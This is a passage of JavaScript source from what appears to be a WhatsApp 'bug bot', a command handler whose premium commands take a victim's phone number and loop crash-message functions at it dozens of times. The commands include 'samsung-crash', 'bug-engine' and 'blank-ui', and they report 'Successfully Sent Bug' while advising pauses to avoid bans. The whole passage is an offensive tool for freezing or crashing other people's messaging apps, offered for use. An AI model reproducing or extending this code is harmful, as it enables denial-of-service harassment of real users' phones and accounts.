await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break

case 'devil-unexpected': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
//=================================================//
case 'notif-ui': case 'notif-crash': case 'crash-total': case '🔥': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await anggazyydevil(target, anggazyycrash)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
//=================================================//
case 'chace-bug': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'samsung-ui': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'enter-samsung': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'samsung-internal': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'samsung-external': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'samsung-crash': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'samsung-reboot': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'samsung-bug': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'bug-quoted': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 50; j++) {
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break

case "bug-engine": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "Naruto-v2": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "bug-prick": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "spesial-bug": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "anything-crash": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-ui": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-ui": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-external": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-internal": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-crash": {

if (!isPremium) return reply(msg.anggazyyprem)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
